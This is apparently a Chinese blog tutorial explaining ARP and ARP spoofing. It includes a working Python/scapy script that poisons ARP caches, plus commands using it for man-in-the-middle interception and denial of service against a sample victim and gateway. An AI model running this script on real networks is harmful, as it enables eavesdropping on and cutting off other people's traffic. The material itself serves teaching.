---
title: "Python 进行 ARP 欺骗"
date: 2021-06-09T18:27:39+08:00
archives: 
    - 2021
tags:
    - Python
    - 网络
image: /images/cyber-security.jpg
draft: false
---

> 声明：本文所用的脚本仅限于学习测试目的，在使用中造成的一切后果与作者无关，后果自负。

ARP (Address Resolution Protocol) 即地址解析协议，是一种将 IP 地址转化成物理地址的协议。我们常用的以太网是通过 MAC 地址进行通信的，所以在网络链路上传送数据帧时，最终是使用硬件地址的。

一个典型的 ARP 流程如下表所示，这里为了叙述方便，硬件地址做了简化处理。

| 源地址      | 目的地址     | 内容                                    |
|----------|----------|---------------------------------------|
| 12:34:56 | ff:ff:ff | Who has 192.168.1.2? Tell 192.168.1.3 |
| 78:ab:cd | 12:34:56 | 192.168.1.2 is at 78:ab:cd            |

大致流程就是`12:34:56`发送一个广播，问谁有某个 IP 地址，当对方收到这个广播时，如果自己的 IP 和广播里问的 IP 是一致的，就发送一个回复给提问者。这样提问者就建立了 IP 地址和物理地址的对应关系。

那如果对方不守信呢，明明自己没有这个 IP，还是坚持回复这个 IP 是自己，欺骗了提问者。这时提问者就会把数据包发给其他人，相当于数据包被人偷了！

没错，ARP 欺骗就是这个原理，可以用来做中间人攻击和拒绝服务攻击。下面分别实验一下两种情况。

网关 IP：10.1.45.254

受害者 IP：10.1.45.2

## 中间人攻击

欺骗受害者网关在我们这里，受害者就会把数据包发给我们，我们再代为转发给真正的网关，相当于做了一个中间人，这时我们可以捕获到受害者的通信数据包。

```python
# arpspoof.py
import sys
from scapy.layers.l2 import Ether, ARP, sendp
from scapy.layers.l2 import getmacbyip

if __name__ == '__main__':
    if len(sys.argv) < 3:
        sys.exit(1)
    target_ip = sys.argv[1]
    host = sys.argv[2]
    target_mac = getmacbyip(target_ip)
    host_mac = getmacbyip(host)
    pkt = Ether() / ARP(op='is-at', psrc=host, pdst=target_ip, hwdst=target_mac)
    print(pkt.show())
    sendp(pkt, inter=2, loop=1)
    print('Cleaning...')
    sendp(Ether(src=host_mac) / ARP(op='is-at', psrc=host, hwsrc=host_mac, pdst=target_ip, hwdst=target_mac), inter=1, count=3)
```
注意这里没有开启 IP 转发，具体如何开启请根据系统自行解决。

```shell
python3 arpspoof.py 10.1.45.2 10.1.45.254
```

## 拒绝服务攻击

欺骗网关受害者在我们这里，网关就会把受害者的数据包发给我们，我们再把它丢弃。这时受害者就无法正常收到回复包，也就无法正常完成通信了。其实中间人攻击也可以做拒绝服务，只需要不转发数据包就好了。

脚本还是一样，只需要把输入的两个参数对调即可。

```shell
python3 arpspoof.py 10.1.45.254 10.1.45.2
```
